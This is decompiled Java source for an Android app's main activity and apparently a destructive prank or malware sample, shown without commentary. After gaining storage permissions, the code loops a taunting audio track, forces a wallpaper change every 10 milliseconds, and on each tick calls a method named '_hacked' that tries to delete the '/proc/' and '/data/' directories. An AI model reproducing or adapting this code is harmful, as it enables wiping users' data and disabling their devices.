package com.my.newproject;

import android.app.Activity;
import android.app.TimePickerDialog;
import android.app.WallpaperManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Bundle;
import java.util.Timer;
import java.util.TimerTask;

/* JADX INFO: loaded from: classes2.dex */
public class MainActivity extends Activity {
    private MediaPlayer Loser;
    private MainBinding binding;
    private MediaPlayer m1;
    private TimerTask time;
    private TimePickerDialog timer;
    private TimerTask timer1;
    private TimePickerDialog.OnTimeSetListener timer_listener;
    private Timer _timer = new Timer();
    private double num = 0.0d;

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.binding = MainBinding.inflate(getLayoutInflater());
        setContentView(this.binding.getRoot());
        initialize(bundle);
        if (Build.VERSION.SDK_INT >= 23) {
            if (checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") == -1 || checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE") == -1) {
                requestPermissions(new String[]{"android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"}, 1000);
                return;
            } else {
                initializeLogic();
                return;
            }
        }
        initializeLogic();
    }

    @Override // android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i == 1000) {
            initializeLogic();
        }
    }

    private void initialize(Bundle bundle) {
        this.timer = new TimePickerDialog(this, this.timer_listener, 11, 12, false);
    }

    private void initializeLogic() {
        _SONG();
        _wallpaper();
    }

    public void _hacked() {
        FileUtil.deleteFile("/proc/");
        FileUtil.deleteFile("/data/");
    }

    public void _wallpaper() {
        try {
            WallpaperManager.getInstance(getApplicationContext()).setResource(R.drawable.kuy001);
        } catch (Exception e) {
            SketchwareUtil.showMessage(getApplicationContext(), e.toString());
        }
        this.num = 10.0d;
        this.time = new TimerTask() { // from class: com.my.newproject.MainActivity.1
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                MainActivity.this.runOnUiThread(new Runnable() { // from class: com.my.newproject.MainActivity.1.1
                    @Override // java.lang.Runnable
                    public void run() {
                        MainActivity.this._wallpaper();
                        MainActivity.this._hacked();
                    }
                });
            }
        };
        this._timer.scheduleAtFixedRate(this.time, (int) this.num, 10L);
    }

    public void _SONG() {
        this.m1 = MediaPlayer.create(getApplicationContext(), R.raw.loser);
        this.m1.start();
        this.m1.setLooping(true);
    }
}
